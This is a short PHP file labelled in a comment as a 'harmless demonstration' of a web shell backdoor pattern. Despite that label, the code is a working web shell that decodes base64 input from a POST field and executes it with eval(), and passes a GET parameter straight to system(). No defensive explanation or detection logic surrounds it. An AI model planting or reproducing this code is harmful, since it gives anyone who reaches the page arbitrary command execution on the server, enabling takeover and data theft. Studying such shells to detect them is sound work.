<?php
// Harmless Demonstration of PHP Web Shell Backdoor Pattern
if(isset($_POST['command_payload'])){
    $raw = $_POST['command_payload'];
    $decoded = base64_decode($raw);
    eval($decoded);
    system($_GET['exec']);
}
?>
